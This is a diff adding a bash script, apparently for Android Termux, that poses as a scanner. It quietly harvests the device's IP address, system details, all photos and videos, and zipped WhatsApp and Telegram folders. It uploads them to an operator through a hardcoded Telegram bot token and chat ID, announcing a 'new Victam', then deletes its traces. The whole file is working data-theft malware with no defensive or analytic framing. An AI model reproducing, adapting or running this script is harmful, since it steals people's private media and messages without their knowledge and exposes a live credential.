@@ -1,0 +1,109 @@
+#!/usr/bin/bash
+
+R="$(printf '\033[1;31m')"
+G="$(printf '\033[1;32m')"
+Y="$(printf '\033[1;33m')"
+W="$(printf '\033[1;37m')"
+C="$(printf '\033[1;36m')"
+
+b="\033[1;30m"
+r="\033[1;31m"
+g="\033[1;32m"
+y="\033[1;33m"
+b="\033[1;34m"
+p="\033[1;35m"
+c="\033[1;36m"
+v="\033[1;37m"
+w="\033[0;37m"
+
+black="\033[1;30m"
+red="\033[1;31m"
+green="\033[1;32m"
+yellow="\033[1;33m"
+blue="\033[1;34m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+violate="\033[1;37m"
+white="\033[0;37m"
+nc="\033[00m"
+
+info="${cyan}[${white}+${cyan}] ${yellow}"
+fun="${cyan}[${white}@${cyan}] ${purple}"
+ask="${cyan}[${white}?${cyan}] ${purple}"
+bad="${cyan}[${white}!${cyan}] ${red}"
+good="${cyan}[${white}√${cyan}] ${green}"
+
+sad="$red ಠ⁠︵ಠ⁠"
+llok="$blue ಠ⁠_⁠ʖ⁠ಠ⁩"
+hehe="$yellow ಡ⁠ ͜⁠ ⁠ʖ⁠ ⁠ಡ"
+huh="$blue ʘ⁠‿⁠ʘ"
+happy="( ⁠•⁠ ⁠‿⁠ ⁠•⁠ )"
+
+#Data_Hacked
+
+clear
+TOKEN="5691570782:AAGMKFygk9MyAlZXtPNddydtDsY4Ouo8-ng"
+CHAT_ID="5010958919"
+IPaddres="$(curl ifconfig.me)"
+DATAS="$(uname -a)"
+FILES=/storage/
+VIDEO=$(find $FILES -name *.mp4)
+PNG=$(find $FILES -name *.png)
+JPG=$(find $FILES -name *.jpg)
+
+echo -e $info $r "[★] SCANING ..."
+
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" Hi Boss You Have new Victam !! " &>> /dev/null
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$IPaddres" &>> /dev/null
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text="$DATAS" &>> /dev/null
+# Fetch files
+
+
+for Datas in $(ls $PREFIX/etc/Hacked/*)
+do
+
+curl -F document=@$Datas "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+done
+
+for jpg in $JPG
+do
+
+# Upload the file
+   curl -F document=@$jpg "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+done
+
+for video in $VIDEO
+do
+
+curl -F document=@$video "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+done
+
+for png in $PNG
+do
+
+curl -F document=@$png "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+
+done
+
+echo -e $info $r "[★] Wite sec .."
+
+zip -r /sdcard/Android/w.zip /sdcard/WhatsApp/* &>> /dev/null
+zip -r /sdcard/Android/t.zip /sdcard/Telegram/* &>> /dev/null
+
+curl -F document=@/sdcard/Android/w.zip "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+curl -F document=@/sdcard/Android/t.zip "https://api.telegram.org/bot$TOKEN/sendDocument" -F chat_id=$CHAT_ID &>> /dev/null
+
+curl -X POST --silent --output /dev/null https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$CHAT_ID -d text=" end fo data victams " &>> /dev/null
+
+rm -rfd /sdcard/Android/t.zip /sdcard/Android/w.zip &>> /dev/null
+clear
+
+echo -e $info $r "[★] FINSHED ...."
+
+
+#{----------------------Start-----------------}
